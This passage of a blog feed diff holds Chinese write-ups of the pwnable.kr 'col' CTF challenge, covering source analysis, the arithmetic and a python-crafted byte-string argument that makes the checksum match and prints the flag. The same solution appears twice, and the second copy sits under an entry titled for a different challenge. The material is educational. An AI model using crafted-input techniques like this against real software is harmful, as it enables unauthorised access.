+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ ./col 06C5CEC806C5CEC806C5CEC806C5CEC806C5CECC</span><br><span class="line">passcode length should be 20 bytes</span><br><span class="line">col@pwnable:~$</span><br></pre></td></tr></table></figure>
+
+<p>明显是不对的，会把每个字符读作一个字节,这样就有40字节了。</p>
+<p>我们实际要将这些值直接写到内存里,也即这些值是已经对应好的ascii值。并且是大端模式，对应数据的高字节存放在低地址。【可以使用GDB进行调试或者两种模式都输入尝试】print 从高地址向低地址写，因此综合与我们书写相反。【大小端应该都懂】</p>
+<p>那么问题来了,如何将这些值直接写到内存里呢? 使用命令：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;print &#x27;\xCC\xCE\xC5\x06&#x27;+&#x27;\xC8\xCE\xC5\x06&#x27;*4&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造输入命令：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./col $(python -c <span class="string">&quot;print &#x27;\xCC\xCE\xC5\x06&#x27;+&#x27;\xC8\xCE\xC5\x06&#x27;*4&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>python -c是指用python解释器执行print ‘\xCC\xCE\xC5\x06’+’\xC8\xCE\xC5\x06’*4</p>
+<p><code>$()</code>指令是括号内的字符串被shell解释为命令行,在执行时，shell首先执行该命令行，并以它的标准输出结果取代整个<code>$()</code>,整个语句的意思是将参数</p>
+<p>‘\xCC\xCE\xC5\x06\xC8\xCE\xC5\x06\xC8\xCE\xC5\x06\xC8\xCE\xC5\x06\xC8\xCE\xC5\x06’</p>
+<p>直接写入到内存。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ ./col $(python -c <span class="string">&quot;print &#x27;\xCC\xCE\xC5\x06&#x27;+&#x27;\xC8\xCE\xC5\x06&#x27;*4&quot;</span>)</span><br><span class="line">daddy! I just managed to create a <span class="built_in">hash</span> collision :)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>daddy! I just managed to create a hash collision :)</p>
+</blockquote>
+<p>验证即可</p>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/f6750490e04ad765f8d2d1e0c10a5679.png" alt="image-20211107223434299"></p>
+<hr>
+<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><hr>
+<p><code>介绍与上一篇有重复</code>  </p>
+<blockquote>
+<p><strong>MD5哈希碰撞</strong></p>
+</blockquote>
+<p>md5是一种被广泛使用的密码散列函数，可以产生一个128位的（16进制）散列值，2004年，我国中科院院士王小云证实md5算法无法防止碰撞，因此，不适用于安全性认证。</p>
+<p>MD5作为文件校验方法已经不可靠了，可以人为制造碰撞。</p>
+<blockquote>
+<p><strong>int main( int argc   , char   * argv[ ]   ,char   * envp[ ])</strong></p>
+</blockquote>
+<p> <strong>main函数的参数列表</strong>保存了输入参数的信息：</p>
+<p>第一个参数argc记录了<strong>输入参数的个数</strong>。且argc是包括程序本身在内的参数个数。如本题目，直接./fd运行，该参数实际上是1，而不是0。</p>
+<p>第二个参数是<strong>字符串数组</strong>的，字符串数组的每个单元是char*类型的，指向一个c风格字符串，arg[ ]指向的数组中至少有一个字符指针，即arg[0].他通常指向程序中的可执行文件的文件名。 </p>
+<p>第三个参数是用来<strong>取得系统的环境变量</strong>，如：在DOS下，有一个PATH变量。当你在DOS提示符下输入一个命令的时候，DOS会首先在当前目录下找这个命令的执行文件。如果找不到，则到PATH定义的路径下去找，找到则执行，找不到返回Bad   command   or   file   name 。在DOS命令提示符下键入set可查看系统的环境变量。</p>
+<blockquote>
+<p><strong>$(python -c “print ‘\xCC\xCE\xC5\x06’+’\xC8\xCE\xC5\x06’ * 4”)详解</strong></p>
+</blockquote>
+<p><code>$(linux命令)</code> 在执行时，shell首先执行该命令行，并以它的标准输出结果取代整个$()</p>
+<p><code>python -c</code> 可以在命令行中调用 python 代码, 实际上 -c 就是 command 的意思</p>
+<p><code>print str</code> 将字符串写入到内存中</p>
+<hr>
+<p>参考:</p>
+<p><a href="https://blog.csdn.net/jxz_dz/article/details/102755923">https://blog.csdn.net/jxz_dz/article/details/102755923</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/131283811">https://zhuanlan.zhihu.com/p/131283811</a></p>
+<p><a href="https://www.pythonheidong.com/blog/article/147292/6142802b1e89b9028188/">https://www.pythonheidong.com/blog/article/147292/6142802b1e89b9028188/</a></p>
+<p><a href="http://blog.chinaunix.net/uid-28463456-id-4090821.html">http://blog.chinaunix.net/uid-28463456-id-4090821.html</a></p>
+<p><a href="https://www.cnblogs.com/chnmig/p/14207100.html">https://www.cnblogs.com/chnmig/p/14207100.html</a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>pwnable.kr</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【pwnable.kr】Toddler‘s Bottle-[random]</title>
+    <url>/2021/12/04/%E3%80%90pwnable.kr%E3%80%91Toddler&#39;s%20Bottle-%5Brandom%5D/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<hr>
+<h1 id="打开题目审题"><a href="#打开题目审题" class="headerlink" title="打开题目审题"></a>打开题目审题</h1><hr>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f81c8e965b7b294bc7b66d730e4818ec.png" alt="image-20211107214527901"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Daddy told me about cool MD5 <span class="built_in">hash</span> collision today.</span><br><span class="line">I wanna <span class="keyword">do</span> something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>题目中提到MD5哈希碰撞，可以基本确定方向</p>
+</blockquote>
+<p>输入命令回车，输入密码：guest 即可登录服务器。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/53cb4d6aa3735a4c6bf27f8cc972e0af.png" alt="image-20211107214836342"></p>
+<hr>
+<h1 id="找到突破口"><a href="#找到突破口" class="headerlink" title="找到突破口"></a>找到突破口</h1><hr>
+<blockquote>
+<p>照例先 <code>ls -la</code></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ ls -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-x---   5 root    col     4096 Oct 23  2016 .</span><br><span class="line">drwxr-xr-x 115 root    root    4096 Dec 22  2020 ..</span><br><span class="line">d---------   2 root    root    4096 Jun 12  2014 .bash_history</span><br><span class="line">-r-sr-x---   1 col_pwn col     7341 Jun 11  2014 col</span><br><span class="line">-rw-r--r--   1 root    root     555 Jun 12  2014 col.c</span><br><span class="line">-r--r-----   1 col_pwn col_pwn   52 Jun 11  2014 flag</span><br><span class="line">dr-xr-xr-x   2 root    root    4096 Aug 20  2014 .irssi</span><br><span class="line">drwxr-xr-x   2 root    root    4096 Oct 23  2016 .pwntools-cache</span><br></pre></td></tr></table></figure>
+
+<p>发现flag文件，尝试查看（肯定看不了</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">fd@pwnable:~$ cat flag</span><br><span class="line">cat: flag: Permission denied</span><br><span class="line">fd@pwnable:~$</span><br></pre></td></tr></table></figure>
+
+<p>果然不能看。看下别的，文件flag肯定是最后的答案，所以需要看看其他文件找寻突破口。</p>
+<p>还有一个c语言源文件<code>col.c</code>和可执行文件<code>col</code>。</p>
+<p>那没什么说的，看看col.c。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ cat col.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>找到重点  system(“/bin/cat flag”);</p>
+</blockquote>
+<p>看到源码大概已经明白了，我们没有查看文件的权限，但是fd有，所以只要分析如何让代码执行<code>system(&quot;/bin/cat flag&quot;);</code>即可。</p>
+<hr>
+<h1 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h1><hr>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ cat col.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    	<span class="comment">// 要有参数 </span></span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    	<span class="comment">// 第一个参数长度必须是20字节</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">// 对argv[1]进行check_password 结果与hashcode 相等</span></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>单独分析<code>unsigned long check_password(const char* p)</code></p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>res 就是将 参数每四个字节相加后的结果，联系main函数，可知我们输入参数每四个字节相加必须hashcode = <code>0x21DD09EC</code>  </p>
+<hr>
+<h1 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h1><hr>
+<p>其实就是计算五个数，五个数相加等于 0x21DD09EC  算一下这五个数。 设为 a、a、a、a、a + b</p>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/077b057dae3d1b7bdb40c3c08b0691e3.png" alt="image-20211107220856130"></p>
+<p>继续计算器计算：0x06C5CEC8  * 5 = 0x21DD09E8  与原数相差 4 </p>
+<p>五个数就计算出来了</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0x06C5CEC8、0x06C5CEC8、0x06C5CEC8、0x06C5CEC8、0x06C5CECC</span><br></pre></td></tr></table></figure>
+
+<p>但是我们如何保证我们输入的数正好以我们想要的形式存在呢。直接作为参数输入的话。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ ./col 06C5CEC806C5CEC806C5CEC806C5CEC806C5CECC</span><br><span class="line">passcode length should be 20 bytes</span><br><span class="line">col@pwnable:~$</span><br></pre></td></tr></table></figure>
+
+<p>明显是不对的，会把每个字符读作一个字节,这样就有40字节了。</p>
+<p>我们实际要将这些值直接写到内存里,也即这些值是已经对应好的ascii值。并且是大端模式，对应数据的高字节存放在低地址。【可以使用GDB进行调试或者两种模式都输入尝试】print 从高地址向低地址写，因此综合与我们书写相反。【大小端应该都懂】</p>
+<p>那么问题来了,如何将这些值直接写到内存里呢? 使用命令：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;print &#x27;\xCC\xCE\xC5\x06&#x27;+&#x27;\xC8\xCE\xC5\x06&#x27;*4&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>构造输入命令：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./col $(python -c <span class="string">&quot;print &#x27;\xCC\xCE\xC5\x06&#x27;+&#x27;\xC8\xCE\xC5\x06&#x27;*4&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>python -c是指用python解释器执行print ‘\xCC\xCE\xC5\x06’+’\xC8\xCE\xC5\x06’*4</p>
+<p><code>$()</code>指令是括号内的字符串被shell解释为命令行,在执行时，shell首先执行该命令行，并以它的标准输出结果取代整个<code>$()</code>,整个语句的意思是将参数</p>
+<p>‘\xCC\xCE\xC5\x06\xC8\xCE\xC5\x06\xC8\xCE\xC5\x06\xC8\xCE\xC5\x06\xC8\xCE\xC5\x06’</p>
+<p>直接写入到内存。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">col@pwnable:~$ ./col $(python -c <span class="string">&quot;print &#x27;\xCC\xCE\xC5\x06&#x27;+&#x27;\xC8\xCE\xC5\x06&#x27;*4&quot;</span>)</span><br><span class="line">daddy! I just managed to create a <span class="built_in">hash</span> collision :)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>daddy! I just managed to create a hash collision :)</p>
+</blockquote>
+<p>验证即可</p>
+<p><img src="https://gitee.com/AGenerousMiser/pic-go-image/raw/master/img/f6750490e04ad765f8d2d1e0c10a5679.png" alt="image-20211107223434299"></p>
+<hr>
+<h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><hr>
+<p><code>介绍与上一篇有重复</code>  </p>
+<blockquote>
+<p><strong>MD5哈希碰撞</strong></p>
+</blockquote>
+<p>md5是一种被广泛使用的密码散列函数，可以产生一个128位的（16进制）散列值，2004年，我国中科院院士王小云证实md5算法无法防止碰撞，因此，不适用于安全性认证。</p>
+<p>MD5作为文件校验方法已经不可靠了，可以人为制造碰撞。</p>
+<blockquote>
+<p><strong>int main( int argc   , char   * argv[ ]   ,char   * envp[ ])</strong></p>
+</blockquote>
+<p> <strong>main函数的参数列表</strong>保存了输入参数的信息：</p>
+<p>第一个参数argc记录了<strong>输入参数的个数</strong>。且argc是包括程序本身在内的参数个数。如本题目，直接./fd运行，该参数实际上是1，而不是0。</p>
+<p>第二个参数是<strong>字符串数组</strong>的，字符串数组的每个单元是char*类型的，指向一个c风格字符串，arg[ ]指向的数组中至少有一个字符指针，即arg[0].他通常指向程序中的可执行文件的文件名。 </p>
+<p>第三个参数是用来<strong>取得系统的环境变量</strong>，如：在DOS下，有一个PATH变量。当你在DOS提示符下输入一个命令的时候，DOS会首先在当前目录下找这个命令的执行文件。如果找不到，则到PATH定义的路径下去找，找到则执行，找不到返回Bad   command   or   file   name 。在DOS命令提示符下键入set可查看系统的环境变量。</p>
+<blockquote>
+<p><strong>$(python -c “print ‘\xCC\xCE\xC5\x06’+’\xC8\xCE\xC5\x06’ * 4”)详解</strong></p>
+</blockquote>
+<p><code>$(linux命令)</code> 在执行时，shell首先执行该命令行，并以它的标准输出结果取代整个$()</p>
+<p><code>python -c</code> 可以在命令行中调用 python 代码, 实际上 -c 就是 command 的意思</p>
+<p><code>print str</code> 将字符串写入到内存中</p>
+<hr>
+<p>参考:</p>
+<p><a href="https://blog.csdn.net/jxz_dz/article/details/102755923">https://blog.csdn.net/jxz_dz/article/details/102755923</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/131283811">https://zhuanlan.zhihu.com/p/131283811</a></p>
+<p><a href="https://www.pythonheidong.com/blog/article/147292/6142802b1e89b9028188/">https://www.pythonheidong.com/blog/article/147292/6142802b1e89b9028188/</a></p>
+<p><a href="http://blog.chinaunix.net/uid-28463456-id-4090821.html">http://blog.chinaunix.net/uid-28463456-id-4090821.html</a></p>
+<p><a href="https://www.cnblogs.com/chnmig/p/14207100.html">https://www.cnblogs.com/chnmig/p/14207100.html</a></p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>pwnable.kr</category>
       </categories>
       <tags>
         <tag>ctf</tag>
